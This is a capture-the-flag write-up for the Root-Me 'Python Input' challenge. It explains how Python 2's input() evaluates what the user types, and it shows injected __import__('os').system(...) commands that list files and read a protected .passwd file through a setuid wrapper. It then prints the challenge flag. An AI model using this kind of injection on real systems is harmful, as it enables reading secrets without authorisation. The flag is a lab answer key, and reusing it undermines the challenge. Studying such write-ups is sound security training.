# Python Input

URL: [https://www.root-me.org/en/Challenges/App-Script/Python-input](https://www.root-me.org/en/Challenges/App-Script/Python-input)

#### Statement

Get the password in the .passwd file by exploiting a vulnerability in this python script.
## Source code
```python
#!/usr/bin/python2
import sys

def youLose():
    print "Try again ;-)"
    sys.exit(1)
 
try:
    p = input("Please enter password : ")
except:
    youLose()
 
with open(".passwd") as f:
    passwd = f.readline().strip()
    try:
        if (p == int(passwd)):
            print "Well done ! You can validate with this password !"
    except:
        youLose()
```

[Download](https://www.root-me.org/local/cache-code/69f230c32ffd3d91d84679c5e88447bf.txt)

## Challenge connection information

| Key        | Value                                                                                                                                                                                                                                                                                                                           |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Host       | challenge02.root-me.org                                                                                                                                                                                                                                                                                                         |
| Protocol   | SSH                                                                                                                                                                                                                                                                                                                             |
| Port       | 2222                                                                                                                                                                                                                                                                                                                            |
| SSH access | [ssh -p 2222 app-script-ch6@challenge02.root-me.org](ssh://app-script-ch6:app-script-ch6@challenge02.root-me.org:2222 "SSH access")     [![](https://www.root-me.org/squelettes/img/webssh.png?1454749832) WebSSH](http://webssh.root-me.org/?location=WebSSH_404&ssh=ssh://app-script-ch6:app-script-ch6@challenge02 "WebSSH") |
| Username   | app-script-ch6                                                                                                                                                                                                                                                                                                                  |
| Password   | app-script-ch6                                                                                                                                                                                                                                                                                                                  |
## Solution

Since we are dealing with Python**2** and not Python**3**, the input function has a serious vulnerability as 2 does something like `eval(input())` for `input()` function. This can be abused

```bash
app-script-ch6@challenge02:~$ ./setuid-wrapper
Please enter password : __import__('os').system('ls -alh')
total 40K
dr-xr-x---  2 app-script-ch6-cracked app-script-ch6         4.0K Dec 10  2021 .
drwxr-xr-x 25 root                   root                   4.0K Sep  5  2023 ..
-r--------  1 root                   root                    898 Dec 10  2021 ._perms
-rw-r-----  1 root                   root                     42 Dec 10  2021 .git
-rw-r-----  1 app-script-ch6         app-script-ch6           54 Dec 10  2021 .motd
-r--------  1 app-script-ch6-cracked app-script-ch6-cracked   33 Dec 10  2021 .passwd
-r-xr-x---  1 app-script-ch6         app-script-ch6          365 Dec 10  2021 ch6.py
-rwsr-x---  1 app-script-ch6-cracked app-script-ch6         7.1K Dec 10  2021 setuid-wrapper
-r--r-----  1 app-script-ch6-cracked app-script-ch6          207 Dec 10  2021 setuid-wrapper.c
app-script-ch6@challenge02:~$ ./setuid-wrapper
Please enter password : __import__('os').system('cat .passwd')
13373439872909134298363103573901
```

::: tip Flag
`13373439872909134298363103573901`
:::

